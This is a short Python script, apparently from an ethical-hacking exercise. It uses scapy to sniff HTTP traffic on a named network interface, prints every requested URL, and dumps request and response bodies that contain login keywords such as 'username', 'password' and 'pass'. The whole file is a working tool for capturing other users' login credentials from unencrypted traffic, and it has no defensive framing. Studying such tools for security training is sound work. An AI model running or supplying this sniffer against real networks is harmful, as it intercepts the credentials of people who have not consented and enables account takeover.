#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http
from optparse import OptionParser


def get_options():
    """Get options from the args parser"""
    parser = OptionParser()
    parser.add_option(
        "-i",
        "--interface",
        dest="interface",
        help="interface to sniff from",
        metavar="INTERFACE"
    )
    (options, args) = parser.parse_args()
    if not options.interface:
        parser.error("Missing interface, use -h or --help for more info")
    return options


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print(url)
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ["username", "user", "id", "password", "login", "log", "pass", "pw"]
            for keyword in keywords:
                if keyword in str(load):
                    print(">>> found LOGIN request: " + str(load) + "\n")
                    break
    elif packet.haslayer(http.HTTPResponse):
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ["Failed", "failed", "Success", "success", "ok", "login", "log", "log in"]
            for keyword in keywords:
                if keyword in str(load):
                    print(">>> found LOGIN answer: " + str(load) + "\n")


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


all_options = get_options()
sniff(all_options.interface)
